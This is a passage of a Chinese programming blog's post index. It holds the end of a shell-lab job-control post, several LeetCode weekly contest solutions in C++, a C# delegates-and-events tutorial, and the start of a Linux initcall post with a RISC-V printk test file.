也就不会调用 sigtstp_handler 将作业状态更改为 ST，shell 因此认为 mystop 程序一直处于前台运行状态，也就保持阻塞。\n既然 sigint_handler 和 sigtstp_handler 在这种情况下无法被调用，那么就需要在其他信号处理函数中进行处理，答案便是 sigchld_handler。事实上，子进程并非只有在终止时才向父进程发送 SIGCHLD 信号，而是在状态发生改变后就会。我们可以利用这一点，将所有对作业队列的操作都放到 sigchld_handler 中，而 sigint_handler 和 sigtstp_handler 只作一个转发作用。\nvoid sigchld_handler(int sig) &#123;    ...    while ((pid = waitpid(-1, &amp;status, WNOHANG | WUNTRACED)) &gt; 0) &#123;        if (WIFEXITED(status)) &#123;             // 子进程正常退出            ...        &#125; else if (WIFSTOPPED(status)) &#123;     // 子进程暂停            ...        &#125; else if (WIFSIGNALED(status)) &#123;    // 子进程终止\t\t\t...        &#125;    &#125;&#125;\n代码evalvoid eval(char *cmdline) &#123;    int bg;    pid_t pid;    char *argv[MAXARGS];    sigset_t mask_all, mask_one, prev_one;  // 用于父-子进程同步        sigfillset(&amp;mask_all);    sigemptyset(&amp;mask_one);    sigaddset(&amp;mask_one, SIGCHLD);    bg = parseline(cmdline, argv);    if (builtin_cmd(argv)) return;    if (access(argv[0], X_OK) != 0) &#123;        printf(&quot;%s: Command not found\\n&quot;, argv[0]);        return;    &#125;    sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one);    if ((pid = fork()) == 0) &#123;        sigprocmask(SIG_SETMASK, &amp;prev_one, NULL);        setpgid(0, 0);  // 将进程组设置为自己的 pid        if (execve(argv[0], argv, environ) &lt; 0) &#123;            printf(&quot;execve %s error\\n&quot;, argv[0]);            exit(1);        &#125;    &#125; else &#123;        sigprocmask(SIG_BLOCK, &amp;mask_all, NULL);        if (bg) &#123;            addjob(jobs, pid, BG, cmdline);            sigprocmask(SIG_SETMASK, &amp;prev_one, NULL);            printf(&quot;[%d] (%d) %s&quot;, getjobpid(jobs, pid)-&gt;jid, pid, cmdline);        &#125; else &#123;            addjob(jobs, pid, FG, cmdline);            sigprocmask(SIG_SETMASK, &amp;prev_one, NULL);            waitfg(pid);        &#125;    &#125;&#125;\nbuilt_cmdint builtin_cmd(char **argv) &#123;    if (!argv[0]) &#123;        return 1;    &#125; else if (strcmp(argv[0], &quot;quit&quot;) == 0) &#123;        exit(0);    &#125; else if (strcmp(argv[0], &quot;jobs&quot;) == 0) &#123;        listjobs(jobs);    &#125; else if (strcmp(argv[0], &quot;bg&quot;) == 0) &#123;        do_bgfg(argv, BG);    &#125; else if (strcmp(argv[0], &quot;fg&quot;) == 0) &#123;        do_bgfg(argv, FG);    &#125; else &#123;        return 0;    &#125;    return 1;&#125;\ndo_bgfg// 根据字符串 arg（格式为 %jid 或 pid）获取对应的 job// 成功返回 job 指针，失败返回 NULLstruct job_t *getjob_arg(const char *arg) &#123;    int isjid, id;    const char *parg;    struct job_t *job;    isjid = 0;    if (arg[0] == &#x27;%&#x27;) &#123;        isjid = 1;        ++arg;    &#125;    parg = arg;    while (*parg != &#x27;\\0&#x27;) &#123;        if (!isdigit(*parg)) &#123;            printf(&quot;bg/fg: argument must be a PID or %%jobid\\n&quot;);            return NULL;        &#125;        ++parg;    &#125;    id = atoi(arg);    if (isjid) &#123;        job = getjobjid(jobs, id);        if (job == NULL) &#123;            printf(&quot;(%s): No such process\\n&quot;, arg);        &#125;    &#125; else &#123;        job = getjobpid(jobs, id);        if (job == NULL) &#123;            printf(&quot;%s: No such job\\n&quot;, arg);        &#125;    &#125;    return job;&#125;// 与题目提供的接口有些不同（加了个 state 参数），感觉这样更好处理一些...void do_bgfg(char **argv, int state) &#123;    sigset_t mask_all, prev_one;    struct job_t *job;    sigfillset(&amp;mask_all);    if (argv[1] == NULL) &#123;        printf(&quot;fg command requires PID or %%jobid argument\\n&quot;);        return;    &#125;    job = getjob_arg(argv[1]);    if (job == NULL) &#123;        return;    &#125;    sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_one);    job-&gt;state = state;    sigprocmask(SIG_SETMASK, &amp;prev_one, NULL);    kill(-job-&gt;pid, SIGCONT);    if (state == FG) &#123;        waitfg(job-&gt;pid);    &#125; else &#123;        printf(&quot;[%d] (%d)&quot;, job-&gt;jid, job-&gt;pid);        for (int i = 0; argv[i] != NULL; ++i) &#123;            printf(&quot; %s&quot;, argv[i]);        &#125;        printf(&quot;\\n&quot;);    &#125;&#125;\nwaitfgvoid waitfg(pid_t pid)&#123;    while (1) &#123;        struct job_t *job = getjobpid(jobs, pid);        if (job == NULL || job-&gt;state != FG) break;    &#125;&#125;\nsigchld_handlervoid sigchld_handler(int sig) &#123;    pid_t pid;    int status;    sigset_t mask_all, prev_one;        sigfillset(&amp;mask_all);    while ((pid = waitpid(-1, &amp;status, WNOHANG | WUNTRACED)) &gt; 0) &#123;        sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_one);        if (WIFEXITED(status)) &#123;            deletejob(jobs, pid);        &#125; else if (WIFSTOPPED(status)) &#123;            printf(&quot;Job [%d] (%d) stopped by signal 20\\n&quot;, pid2jid(pid), pid);            getjobpid(jobs, pid) -&gt; state = ST;        &#125; else if (WIFSIGNALED(status)) &#123;            printf(&quot;Job [%d] (%d) terminated by signal 2\\n&quot;, pid2jid(pid), pid);            deletejob(jobs, pid);        &#125;        sigprocmask(SIG_SETMASK, &amp;prev_one, NULL);    &#125;&#125;\nsigint_handlervoid sigint_handler(int sig) &#123;    pid_t pid = fgpid(jobs);    kill(-pid, sig);&#125;\nsigtstp_handlervoid sigtstp_handler(int sig) &#123;    pid_t pid = fgpid(jobs);    kill(-pid, sig);&#125;\n","categories":["计算机基础"],"tags":["经验","计算机基础","C"]},{"title":"LeetCode周赛总结 第327场","url":"/2023/01/08/LeetCode%E5%91%A8%E8%B5%9B%E6%80%BB%E7%BB%93%20%E7%AC%AC327%E5%9C%BA/","content":"由于考研等因素的影响，已经时隔一年没有参加力扣周赛了，长时间没有好好琢磨算法题，思维敏捷度确实有所下降，好在这次周赛前两题都没有什么难度，但第三题却把简单问题想复杂了，第四题就基本上都没怎么读题了。。。\n\n正整数和负整数的最大计数题目链接正整数和负整数的最大计数\n解题思路直接依照题意统计该数组中正整数和负整数的个数，然后返回较大个数即可，送分题。\n解题代码class Solution &#123;public:    int maximumCount(vector&lt;int&gt;&amp; nums) &#123;        int cnt1 = 0, cnt2 = 0;        for (int i = 0; i &lt; nums.size(); ++i) &#123;            if (nums[i] &gt; 0) &#123;                ++cnt1;            &#125;            else if (nums[i] &lt; 0) &#123;                ++cnt2;            &#125;        &#125;        return max(cnt1, cnt2);    &#125;&#125;;\n执行 K 次操作后的最大分数题目链接执行 K 次操作后的最大分数\n解题思路同样也是直接模拟，既然要求的是所能获得的最大分数，那么只需保证每次从数组中选取的是当前数组的最大值即可。对于此类贪心选择问题，容易想到利用优先队列（基于堆实现），相较于顺序查找最大值，优先队列可将每次选取最大值的时间复杂度降至 O(log(n))。\n具体步骤是先将数组所有元素存入优先队列中，然后选出队头元素（即最大值）并出队，分数累加该值后，按照题意将该值替换为 ceil(nums[i]) / 3，再存入优先队列中，重复操作 k 次即可得到结果。\n对于向上取整的处理很简单，只需判断该数 val 能否被 3 整除，若能，则直接令 val = val / 3 即可，若不能，由于整数相除会舍弃小数位，即相当于向下取整，因此令 val = val / 3 + 1.\n解题代码class Solution &#123;public:    long long maxKelements(vector&lt;int&gt;&amp; nums, int k) &#123;        priority_queue&lt;int&gt; maxQueue;        for (int i = 0; i &lt; nums.size(); ++i) &#123;            maxQueue.emplace(nums[i]);        &#125;        long long res = 0;        for (int i = 0; i &lt; k; ++i) &#123;            int maxVal = maxQueue.top();            maxQueue.pop();            res += maxVal;            if (maxVal % 3 == 0) &#123;                maxVal /= 3;            &#125;            else &#123;                maxVal = maxVal / 3 + 1;            &#125;            maxQueue.emplace(maxVal);        &#125;        return res;    &#125;&#125;;\n使字符串总不同字符的数目相等题目链接使字符串总不同字符的数目相等\n解题思路本题最开始写的时候思路很不清晰，写了一大堆判断条件最终也没能成功求解。\n事实上本题如果注意到一个关键点就能很快建立思路，即两字符串之间各个字符的交换其实完全可以等价为两字符串之间各种字符的交换，因为题目要求两字符串不同字符个数相同，因此其实与各字符所处的下标无关，即当 word1 = &quot;abcc&quot;, word2 = &quot;aab&quot; 时，word1[2] 和 word2[0] 交换与 word1[3] 和 word[1] 交换其实是完全一样的。明白这一点之后，发现交换的可能性最大不过 26 * 26 种，完全可以直接枚举求解。\n基本求解步骤如下：对于 word1 和 word2 分别设置长度为 26 的数组 chCnt1 和 chCnt2 统计各字母在字符串的个数，cnt1 和 cnt2 分别统计两字符串不同字符的个数。然后执行一个 26 * 26 的二重循环，表示 word1 的 i 字符与 word2 的 j 字符交换，修改 chCnt1, chCnt2 的值，以判断交换后是否满足不同字符个数相同，若不满足，将修改过的 chCnt 数组复原。\n解题代码class Solution &#123;public:    bool isItPossible(string word1, string word2) &#123;        int cnt1 = 0, cnt2 = 0;        vector&lt;int&gt; chCnt1(26, 0), chCnt2(26, 0);        for (int i = 0; i &lt; word1.size(); ++i) &#123;            int idx = word1[i] - &#x27;a&#x27;;            if (chCnt1[idx] == 0) &#123;                ++cnt1;            &#125;            ++chCnt1[idx];        &#125;        for (int i = 0; i &lt; word2.size(); ++i) &#123;            int idx = word2[i] - &#x27;a&#x27;;            if (chCnt2[idx] == 0) &#123;                ++cnt2;            &#125;            ++chCnt2[idx];        &#125;        for (int i = 0; i &lt; 26; ++i) &#123;            for (int j = 0; j &lt; 26; ++j) &#123;                if (chCnt1[i] == 0 || chCnt2[j] == 0) &#123;                    continue;                &#125;                int c1 = cnt1, c2 = cnt2;                --chCnt1[i];                if (chCnt1[i] == 0) --c1;                ++chCnt1[j];                if (chCnt1[j] == 1) ++c1;                --chCnt2[j];                if (chCnt2[j] == 0) --c2;                ++chCnt2[i];                if (chCnt2[i] == 1) ++c2;                if (c1 == c2) &#123;                    return true;                &#125;                ++chCnt1[i];                --chCnt1[j];                ++chCnt2[j];                --chCnt2[i];            &#125;        &#125;        return false;    &#125;&#125;;\n","categories":["数据结构与算法"],"tags":["C++","算法","数据结构"]},{"title":"CSharp事件和委托","url":"/2021/05/29/CSharp%E4%BA%8B%E4%BB%B6%E5%92%8C%E5%A7%94%E6%89%98/","content":"委托与事件在开发中的应用非常广泛，本文将简单介绍C#中委托和事件的定义、使用方法，以及它们之间的区别和联系。\n\n委托C#中的委托（delegate）类似于C/C++中的函数指针，是一种存在对某个方法的引用的引用类型变量，所有的委托都派生自System.Delegate类。\n委托的声明声明委托的语法如下：\ndelegate &lt;return type&gt; &lt;delegate name&gt; &lt;parameter list&gt;\n比方说，我要声明一个无返回值，无参数的委托。\npublic delegate void MyDelegate();\n在声明了委托类型后，必须将其实例化才能生效，可以使用new关键字创建并传入参数（参数为一个特定的方法名）。\nMyDelegate myDelegate = new MyDelegate(Func1);\n以上实例中我们实例化了一个带有Func1方法引用的MyDelegate类型变量，并将其赋值给了myDlegate实例。\n委托的调用如果想让委托调用它所引用的方法，可以直接仿照方法调用的写法。\nmyDelegate();\n多播委托其实一个委托类型的变量可以同时包含多个方法的引用，如果要在委托实例化后对方法引用进行增删操作，可以使用+=或-=运算符。\n例如我们要给myDelegate添加Func2和Func3方法并删除对Func1方法的引用。\nmyDelegate += Func2;myDelegate += Func3;myDelegate -= Func1;\n预定义委托在.NET Framework 3.5以来，提供了很多的泛型委托，原先需要手动定义的现在可以直接使用了。\nAction委托Action委托代表返回为空的委托，以下示例实例化一个Action委托，并引用Plus方法。\npublic void Plus(int a,int b)&#123;\tConsole.WriteLine(a + b);&#125;Action&lt;int,int&gt; a = Plus;\n泛型类型指定为方法的参数类型，最多可指定16个。\nFunc委托Func委托代表返回值非空的委托，以下实例化一个Func委托，并引用ConnectString方法。\npublic string ConnectString(string s1,string s2)&#123;    return s1 + s2;&#125;Func&lt;string,string,string&gt; f = ConnectString;\n最后一位泛型类型指定方法的返回值类型，前面各类型指定方法参数类型，同样最多指定16个。\n事件事件（Event）可以理解为一种封装好的委托，用于程序对用户的某些操作进行响应。事件在类内声明，通过使用同一个类或其他类中的委托与事件处理程序相关联。\n通过委托创建事件事件的声明事件声明方法与实例化委托很类似，不同之处在于需要在委托类型前加上event关键字。\npublic delegate void MyDelegate();public event MyDelegate myEvent;\n与委托变量的区别\n事件只能作为类的成员变量\nclass DelegateClass&#123;    public delegate void MyDelegate();    public event MyDelegate myEvent1; //编译通过    static void Main(string[] args)&#123;        event MyDelegate myEvent2; //编译出错    &#125;&#125;\n\n事件只能在类内调用\npublic delegate void MyDelegate();class DelegateClass&#123;    public event MyDelegate myEvent;    public void EventFunc()&#123;        myEvent(); //编译通过    &#125;&#125;class Test&#123;    static void Main(string[] args)&#123;        DelegateClass delegateClass = new DelegateClass();        delegateClass.myEvent(); //编译出错    &#125;&#125;\n\n\n发布-订阅模式事件使用发布-订阅（publisher-subscriber）模型，在这个模型中，发布器（publisher）为包含事件的类，订阅器（subscriber）为接收事件的类，调度中心（Topic）为事件。\n以下通过一个简单的案例来更好的理解这种模式。\nusing System;using System.Collections.Generic;using System.Text;namespace CSharp事件&#123;    //发布器    class Publisher    &#123;        private int value;        public Publisher(int v)        &#123;            value = v;        &#125;        //声明委托以及事件        public delegate void MyDelegate();        public event MyDelegate changeValue;        public void SetValue(int v)        &#123;            int formerValue = value;            value = v;            Console.WriteLine(&quot;Set is complete!&quot;);            //当value值改变时，调用事件            if (changeValue != null &amp;&amp; formerValue != value)                changeValue();        &#125;    &#125;    //订阅器    class Subscriber    &#123;        public void Print()        &#123;            Console.WriteLine(&quot;The value has been changed!&quot;);        &#125;    &#125;    class MainClass    &#123;        static void Main(string[] args)        &#123;            //实例化订阅器并赋value为3            Publisher publisher = new Publisher(3);            Subscriber subscriber = new Subscriber();            //将订阅器中的方法Print注册到发布器的事件中            publisher.changeValue += subscriber.Print;            //从控制台接受一个整数            int v = Convert.ToInt32(Console.ReadLine());            //设置订阅器对象的value值            publisher.SetValue(v);        &#125;    &#125;&#125;\n当输入的值为3（与初始化value值相同），输出结果如下：\n\n当输入值为5（与初始化value值不同），输出结果如下：\n\n","categories":["CSharp"],"tags":[".NET","CSharp","事件","委托"]},{"title":"LeetCode周赛总结 第331场","url":"/2023/02/05/LeetCode%E5%91%A8%E8%B5%9B%E6%80%BB%E7%BB%93%20%E7%AC%AC331%E5%9C%BA/","content":"从数量最多的堆取走礼物题目链接从数量最多的堆取走礼物\n解题思路直接按照流程模拟即可，将数组 gifts 的元素放入优先队列中，然后每次从中选出最大值 maxGift，再将 sqrt(maxGift) 放回队列，重复 k 次，计算队列剩余的值总和。\n解题代码class Solution &#123;public:    long long pickGifts(vector&lt;int&gt;&amp; gifts, int k) &#123;        // 这里求 gifts 总和要注意累加初始值定义为 0ll（long long 类型），否则 int 可能溢出        // 当然也可以不求初始总数量，而在循环结束后直接统计剩余的数量        long long sum = accumulate(gifts.begin(), gifts.end(), 0ll);        priority_queue&lt;int&gt; Q(gifts.begin(), gifts.end());        long long res = 0;        for (int i = 0; !Q.empty() &amp;&amp; i &lt; k; ++i) &#123;            int maxGift = Q.top();            Q.pop();            int maxSqrt = (int)sqrt(maxGift);            res += maxGift - maxSqrt;            Q.emplace(maxSqrt);        &#125;        return sum - res;    &#125;&#125;;\n统计范围内的元音字符串数题目链接统计范围内的元音字符串数\n解题思路题目要求解多个区间的元音字符串个数，可以考虑使用前缀和的技巧：即指定一个前缀和数组 preSum，preSum[i] 表示区间 [0, i)（左闭右开）上元音字符串的个数，那么任意区间 [l, r] 的元音字符串个数为 preSum[r + 1] - preSum[l].\n而求前缀和就比较简单了，从 i = 0 开始循环，如果字符串 words[i] 为元音字符串，则 preSum[i + 1] = preSum[i] + 1，否则 preSum[i + 1] = preSum[i].\n解题代码class Solution &#123;public:    vector&lt;int&gt; vowelStrings(vector&lt;string&gt;&amp; words, vector&lt;vector&lt;int&gt;&gt;&amp; queries) &#123;        unordered_set&lt;char&gt; alphaSet = &#123; &#x27;a&#x27;,&#x27;e&#x27;,&#x27;i&#x27;,&#x27;o&#x27;,&#x27;u&#x27; &#125;;        int sum = 0, n = words.size();        vector&lt;int&gt; preSum(n + 1, 0);        for (int i = 0; i &lt; n; ++i) &#123;            string str = words[i];            if (alphaSet.count(str.front()) &amp;&amp; alphaSet.count(str.back())) &#123;                preSum[i + 1] = preSum[i] + 1;            &#125;            else &#123;                preSum[i + 1] = preSum[i];            &#125;        &#125;        vector&lt;int&gt; res;        for (int i = 0; i &lt; queries.size(); ++i) &#123;            int l = queries[i][0], r = queries[i][1];            int cnt = preSum[r + 1] - preSum[l];            res.emplace_back(cnt);        &#125;        return res;    &#125;&#125;;\n重排水果题目链接重排水果\n解题思路由于交换两水果的成本为 min(basket1[i], basket2[i])，很容易想到的交换方法忽视两果篮中共有的水果，挨个让 basket1 中成本最大的水果和 basket2 中成本最小的水果进行交换。但事实上这样忽视了一种情况：假设 basket1 中有水果 …basket1[i]…basket1[j]…，basket2 中有水果 …basket2[i]…，如果 2 * basket1[j] &lt; min(basket1[i], basket2[i])，那么如果以 basket1[j] 为中介，分别与 basket2[i] 和 basket1[i] 交换，所花的代价更小，因此交换成本为 min(basket1[i], basket2[i], 2 * minVal).\n具体代码实现部分，可以用哈希表记录 basket1 和 basket2 中各水果成本和相对数量（basket1 相对数量为正，basket2 相对数量为负）。统计完成后，分别将相对数量大于零的和相对数量小于零的成本值存放在两个数组中，分别升序排序和降序排序，按照上述交换方案计算总交换成本。\n解题代码class Solution &#123;public:    long long minCost(vector&lt;int&gt;&amp; basket1, vector&lt;int&gt;&amp; basket2) &#123;        unordered_map&lt;int, int&gt; fruitCnt;        for (int i = 0; i &lt; basket1.size(); ++i) &#123;            ++fruitCnt[basket1[i]];        &#125;        for (int i = 0; i &lt; basket2.size(); ++i) &#123;            --fruitCnt[basket2[i]];        &#125;        int minVal = INT32_MAX;        vector&lt;int&gt; fruits1, fruits2;        for (const auto&amp; fc : fruitCnt) &#123;            int f = fc.first, c = fc.second;            if (abs(c) % 2 == 1) return -1; // 若相对数量为奇数，则必定无法相等            minVal = min(minVal, f);            if (c &gt; 0) &#123; // 一次交换使相对数量的绝对值减小2                for (int i = abs(c) / 2; i &gt; 0; --i) &#123;                    fruits1.emplace_back(f);                &#125;            &#125;            else if (c &lt; 0) &#123;                for (int i = abs(c) / 2; i &gt; 0; --i) &#123;                    fruits2.emplace_back(f);                &#125;            &#125;        &#125;        if (fruits1.size() != fruits2.size()) return -1;        long long res = 0;        sort(fruits1.begin(), fruits1.end(), less&lt;int&gt;());        sort(fruits2.begin(), fruits2.end(), greater&lt;int&gt;());        for (int i = 0; i &lt; fruits1.size(); ++i) &#123;            res += min(min(fruits1[i], fruits2[i]), 2 * minVal);        &#125;        return res;    &#125;&#125;;\n","categories":["数据结构与算法"],"tags":["C++","算法","数据结构"]},{"title":"LeetCode周赛总结 第277场","url":"/2022/01/23/LeetCode%E5%91%A8%E8%B5%9B%E6%80%BB%E7%BB%93%20%E7%AC%AC277%E5%9C%BA/","content":"本次周赛没想到比上周还要简单，前三题都可以用非常简单的方法快速解决，第四题如果想对了方向其实也比较简单。\n\n元素计数题目链接元素计数\n解题思路相当基础的题目，要同时具有一个严格较小元素和一个严格较大元素，只需要保证这个数 num 满足 num &gt; minVal &amp;&amp; num &lt; maxVal即可。\n解题代码class Solution &#123;public:    int countElements(vector&lt;int&gt;&amp; nums) &#123;        int minVal = INT32_MAX, maxVal = INT32_MIN;        for (int i = 0; i &lt; nums.size(); i++) &#123;            minVal = min(minVal, nums[i]);            maxVal = max(maxVal, nums[i]);        &#125;        int res = 0;        for (int i = 0; i &lt; nums.size(); i++) &#123;            if (nums[i] &gt; minVal &amp;&amp; nums[i] &lt; maxVal)                res++;        &#125;        return res;    &#125;&#125;;\n按符号重排数组题目链接按符号重排数组\n解题思路最容易想到和实现的方法显然是将正数和负数分别存入两个数组，再合并到一个数组中，虽然这样做空间复杂度比较高，但思路最为简单，代码实现相对较快。\n解题代码class Solution &#123;public:    vector&lt;int&gt; rearrangeArray(vector&lt;int&gt;&amp; nums) &#123;        vector&lt;int&gt; posVec;        vector&lt;int&gt; negVec;        for (int i = 0; i &lt; nums.size(); i++) &#123;            if (nums[i] &gt; 0)                posVec.emplace_back(nums[i]);            if (nums[i] &lt; 0)                negVec.emplace_back(nums[i]);        &#125;        vector&lt;int&gt; res;        for (int i = 0; i &lt; posVec.size(); i++) &#123;            res.emplace_back(posVec[i]);            res.emplace_back(negVec[i]);        &#125;        return res;    &#125;&#125;;\n找出数组中的所有孤独数字题目链接找出数组中的所有孤独数字\n解题思路对数字进行统计，考虑使用哈希表 HashMap 存储数组的数据，哈希表的 key 为数组中的数字，value 为该数字出现的次数。\n再次遍历数组，对数组的每一个元素 num 判断 HashMap[num] 是否为 1，并且 HashMap[num - 1] 和 HashMap[num + 1] 是否存在，若都满足，则该数字为孤独数字，加入结果中。\n解题代码class Solution &#123;public:    vector&lt;int&gt; findLonely(vector&lt;int&gt;&amp; nums) &#123;        unordered_map&lt;int, int&gt; numsMap;        for (int i = 0; i &lt; nums.size(); i++) &#123;            numsMap[nums[i]]++;        &#125;        vector&lt;int&gt; res;        for (int i = 0; i &lt; nums.size(); i++) &#123;            if (numsMap[nums[i]] == 1) &#123;                if (numsMap.count(nums[i] - 1) == 0 &amp;&amp; numsMap.count(nums[i] + 1) == 0)                    res.emplace_back(nums[i]);            &#125;        &#125;        return res;    &#125;&#125;;\n基于陈述统计最多好人数题目链接基于陈述统计最多好人数\n解题思路本题测试用例中中 2 &lt;= n &lt;= 15，数据量很小，可以考虑直接枚举所有的情况，并检验该情况下是否合理。\n所有可能情况个数为 2n，每种情况用二进制数 anan - 1···a0 来表示，an 为 0 代表该情况下 n 角色为 坏人，an 为 1 代表该情况下 n 角色为 好人。\n在统计了该情况下的角色情况后，就对其进行验证。由于坏人既可能说真话也可能说假话，因此对其验证没有意义，我们只需要对该情况下的好人进行验证。验证方法是遍历这个好人的陈述，若出现陈述与该情况不符，则该情况不符合条件，不统计其好人的数目。最终遍历所有的情况后，得到符合条件的好人最大数目。\n解题代码class Solution &#123;public:    int maximumGood(vector&lt;vector&lt;int&gt;&gt;&amp; statements) &#123;        int n = statements.size();        int res = 0;        for (int i = 0; i &lt; (1 &lt;&lt; n); i++) &#123;            int cnt = 0;            vector&lt;bool&gt; isGood(n);            for (int j = 0; j &lt; n; j++) &#123;                if ((i &gt;&gt; j) &amp; 1) &#123; // 统计状态 i 的好人与坏人                    isGood[j] = true;                    cnt++;                &#125;                else                    isGood[j] = false;            &#125;            // 验证状态是否合理            bool isLegal = true;            for (int j = 0; j &lt; n; j++) &#123;                if (isGood[j]) &#123; // 若 j 是好人，则遍历他的陈述是否正确                    for (int k = 0; k &lt; n; k++) &#123;                        if (statements[j][k] == 1 &amp;&amp; !isGood[k]) &#123;                            isLegal = false;                            break;                        &#125;                        if (statements[j][k] == 0 &amp;&amp; isGood[k]) &#123;                            isLegal = false;                            break;                        &#125;                    &#125;                &#125;            &#125;            if(isLegal)                res = max(res, cnt);        &#125;        return res;    &#125;&#125;;\n","categories":["数据结构与算法"],"tags":["C++","算法","数据结构"]},{"title":"LeetCode周赛总结 第333场","url":"/2023/02/19/LeetCode%E5%91%A8%E8%B5%9B%E6%80%BB%E7%BB%93%20%E7%AC%AC333%E5%9C%BA/","content":"合并两个二维数组 - 求和法题目链接合并两个二维数组 - 求和法\n解题思路本题较为基础，可以直接分别遍历两数组，再用哈希表记录两数组中各编号的累加和，但该方法比较消耗空间，时间上的性能也不理想。\n考虑到数组 nums1 和 nums2 都包含互不相同的 id，并按 id 以递增顺序排列，因此想到利用归并排序的思想，设立双指针 p1 和 p2，若两指针所指数组元素的 id 相同，则将 { nums1[p1][0], nums1[p1][1] + nums2[p2][1] } 进行归并，否则将较小 id 的元素（假设 p1 所指元素 id 更小） { nums1[p1][0], nums1[p1][1] } 进行归并。\n解题代码class Solution &#123;public:    vector&lt;vector&lt;int&gt;&gt; mergeArrays(vector&lt;vector&lt;int&gt;&gt;&amp; nums1, vector&lt;vector&lt;int&gt;&gt;&amp; nums2) &#123;        vector&lt;vector&lt;int&gt;&gt; res;        int p1 = 0, p2 = 0;        while (p1 &lt; nums1.size() &amp;&amp; p2 &lt; nums2.size()) &#123;            if (nums1[p1][0] == nums2[p2][0]) &#123;                res.push_back(&#123; nums1[p1][0], nums1[p1][1] + nums2[p2][1] &#125;);                ++p1;                ++p2;            &#125;            else if (nums1[p1][0] &lt; nums2[p2][0]) &#123;                res.push_back(&#123; nums1[p1][0], nums1[p1][1] &#125;);                ++p1;            &#125;            else &#123;                res.push_back(&#123; nums2[p2][0], nums2[p2][1] &#125;);                ++p2;            &#125;        &#125;        while (p1 &lt; nums1.size()) &#123;            res.push_back(&#123; nums1[p1][0], nums1[p1][1] &#125;);            ++p1;        &#125;        while (p2 &lt; nums2.size()) &#123;            res.push_back(&#123; nums2[p2][0], nums2[p2][1] &#125;);            ++p2;        &#125;        return res;    &#125;&#125;;\n将整数减少到零需要的最少操作数题目链接将整数减少到零需要的最少操作数\n解题思路本题我最开始想往位运算的思路上出发，但无法得到一个有效的解法。\n最后在题目示例中发现一个规律：要想使得操作次数最小，每次需要减去或加上离当前正整数 n 最近的 2 的幂数，而该幂数可能是第一个大于 n 的幂数，或是第一个小于 n 的幂数，若 n 本身就是 2 的幂数，则操作次数为 1。\n由此可想到利用递归分治的思想，若第一个大于 n 的幂数为 n1，第一个小于 n 的幂数为 n2，使 n 等于 0 需要执行的最少操作数为： 使得 n1 - n 等于 0 和 使得 n - n2 等于 0 需要执行得最少操作次数中得较小值加上 1，即 minOperations(n) = min(minOperations(n1 - n), minOperations(n - n2)) + 1.\n解题代码class Solution &#123;public:    int minOperations(int n) &#123;        int n1 = 1;        while (n1 &lt; n) &#123;            n1 *= 2;        &#125;        if (n1 == n) return 1;        int n2 = n1 / 2;        return min(minOperations(n1 - n), minOperations(n - n2)) + 1;    &#125;&#125;;\n","categories":["数据结构与算法"],"tags":["C++","算法","数据结构"]},{"title":"Linux内核initcall初始化机制","url":"/2025/09/07/Linux%E5%86%85%E6%A0%B8initcall%E5%88%9D%E5%A7%8B%E5%8C%96%E6%9C%BA%E5%88%B6/","content":"本文将介绍 Linux 内核的初始化函数结构，其通过 initcall 机制来实现，其核心是一系列优先级不同的宏，用于控制初始化函数的执行顺序。本文的实验的内核环境基于 Linux 5.10。\n\ninitcall 的级别与执行顺序Linux 内核定义了多个初始化级别（按照执行顺序从高到低排列）：\n\n\n\n\n宏定义\n级别名\n优先级值\n用途说明\n\n\n\n\nearly_initcall(fn)\nearly\n-\n早期的初始化，在 SMP 初始化之前\n\n\npure_initcall(fn)\npure\n0\n用于初始化不能被静态初始化的变量\n\n\ncore_initcall(fn)\ncore\n1\n核心子系统初始化\n\n\npostcore_initcall(fn)\npostcore\n2\n核心子系统之后的初始化\n\n\narch_initcall(fn)\narch\n3\n架构相关初始化\n\n\nsubsys_initcall(fn)\nsubsys\n4\n子系统初始化\n\n\nfs_initcall(fn)\nfs\n5\n文件系统初始化\n\n\nrootfs_initcall(fn)\nrootfs\n-\n根文件系统初始化\n\n\ndevice_initcall(fn)\ndevice\n6\n设备驱动初始化（最常用）\n\n\nlate_initcall(fn)\nlate\n7\n晚期初始化（依赖其他子系统就绪）\n\n\nconsole_initcall(fn)\nconsole\n-\n终端初始化\n\n\n\n\n\n每个级别都有对应的 _sync 版本（如 core_initcall_sync），用于等待该级别所有异步初始化完成。\n\n为了直观的看到不同 initcall 的先后顺序，可以编写一个简单的测试程序加以验证。\n目标架构以 RISC-V 为例，新建一个 C 源文件 arch/riscv/kernel/initcall_test.c，代码如下：\n#include &lt;linux/init.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/module.h&gt;static int __init early_test_init(void)&#123;    printk(KERN_INFO &quot;[RISC-V Initcall] early_initcall executed\\n&quot;);    return 0;&#125;early_initcall(early_test_init);static int __init pure_test_init(void)&#123;    printk(KERN_INFO &quot;[RISC-V Initcall] pure_initcall executed\\n&quot;);    return 0;&#125;pure_initcall(pure_test_init);static int __init core_test_init(void)&#123;    printk(KERN_INFO &quot;[RISC-V Initcall] core_initcall executed\\n&quot;);    return 0;&#125;core_initcall(core_test_init);static int __init postcore_test_init(void)&#123;    printk(KERN_INFO &quot;[RISC-V Initcall] postcore_initcall executed\\n&quot;);    return 0;&#125;postcore_initcall(postcore_test_init);static int __init arch_test_init(void)&#123;    printk(KERN_INFO &quot;[RISC-V Initcall] arch_initcall executed\\n&quot;);    return 0;&#125;arch_initcall(arch_test_init);static int __init subsys_test_init(void)&#123;    printk(KERN_INFO &quot;[RISC-V Initcall] subsys_initcall executed\\n&quot;);    return 0;&#125;subsys_initcall(subsys_test_init);static int __init fs_test_init(void)&#123;    printk(KERN_INFO &quot;[RISC-V Initcall] fs_initcall executed\\n&quot;);    return 0;&#125;fs_initcall(fs_test_init);static int __init rootfs_test_init(void)&#123;    printk(KERN_INFO &quot;[RISC-V Initcall] rootfs_initcall executed\\n&quot;);    return 0;&#125;rootfs_initcall(rootfs_test_init);static int __init device_test_init(void)&#123;    printk(KERN_INFO &quot;[RISC-V Initcall] device_initcall executed\\n&quot;);    return 0;&#125;device_initcall(device_test_init);static int __init late_test_init(void)&#123;    printk(KERN_INFO &quot;[RISC-V Initcall] late_initcall executed\\n&quot;);    return 0;&#125;late_initcall(late_test_init);static int __init console_test_init(void)&#123;    printk(KERN_INFO &quot;[RISC-V Initcall] console_initcall executed\\n&quot;);    return 0;&#125;console_initcall(console_test_init);\n同时在 arch/riscv/kernel/Makefile 中新增该目标文件：\n--- 